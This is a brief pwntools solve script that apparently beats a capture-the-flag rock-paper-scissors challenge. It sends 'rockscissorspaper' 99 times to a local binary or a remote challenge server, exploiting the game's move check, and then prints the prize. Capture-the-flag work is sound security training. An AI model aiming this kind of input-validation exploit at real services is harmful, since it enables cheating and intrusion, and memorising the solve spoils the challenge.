#!/usr/bin/env python3

from pwn import *

#context.log_level="debug"

if args.REMOTE:
    p = remote("165.232.98.59", 30874)
else:
    p = process("./janken")

p.sendlineafter(b"> ", b"1")

for i in range(0,99):
    p.sendlineafter(b"> ", b"rockscissorspaper")

p.recvuntil(b"prize:")
print(p.recvline().decode())
